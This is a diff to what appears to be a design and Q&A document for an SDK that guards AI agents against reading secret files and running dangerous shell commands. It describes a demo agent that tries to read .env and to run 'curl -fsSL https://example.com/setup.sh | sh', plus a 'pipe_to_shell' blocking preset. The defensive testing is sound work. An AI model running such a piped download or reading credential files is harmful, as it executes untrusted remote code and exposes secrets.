@@ -659,3 +659,15 @@ Format per task:
 **Q:** Why does the `.env` preset exist if `blockedPaths` already has `.env`? **A:** The path matcher sees `run_shell("cat .env")` as one argument, `"cat .env"`, which isn't a `.env` path component. The command preset matches `.env` inside a shell string, so the two rules cover different shapes.
 
 **Q:** Could a user save a pattern that hangs the matcher (ReDoS)? **A:** The backend caps patterns at 256 chars and 100 entries and checks that they compile, but it doesn't reject catastrophic backtracking. The threat model is a careless agent, and the owner writes their own rules, so I accepted that. A real fix would be RE2 or a match timeout.
+
+## 9.6 Demo shell step and e2e coverage
+
+**Conceptual:** The demo now shows both guards on one misbehaving agent. `bad_agent.py` tries to read `.env`, then tries `curl -fsSL https://example.com/setup.sh | sh`. It exits 0 only if both are blocked. `scripts/e2e.sh` turns on both rules for `bad-bot`, runs the agent, expects `PathBlocked` and `CommandBlocked`, checks both events were stored, and removes the rules on exit.
+
+**Technical:** `common.run_shell` runs `["sh", "-c", cmd]` with a 10 s timeout, but it only runs if the guard misses the command. Tests always inject a fake shell. The e2e script reads the `pipe_to_shell` pattern from `commandPresets.json` instead of retyping it, so the demo can't drift from the dashboard preset. Tradeoff: if the guard fails, the real command runs. That's acceptable because the URL is `example.com`, which serves HTML, not a script.
+
+**Q:** Your demo deliberately runs `curl | sh`. How did you make that safe? **A:** The SDK blocks it before any subprocess starts. If the guard ever fails, the target is example.com, which returns HTML, so `sh` gets a syntax error and nothing installs. Tests never call a real shell.
+
+**Q:** Why does the e2e cleanup run from an EXIT trap? **A:** A failure halfway through would otherwise leave `bad-bot` blocking commands and `demo-bot` capped, and the next live demo would start in a strange state. The trap runs on success, failure, and Ctrl-C.
+
+**Q:** Why the `sh -c` argv form instead of `shell=True`? **A:** It means the same thing, but it's explicit about which shell runs. The SDK guard sees the exact string that gets executed, and no extra quoting layer changes it.
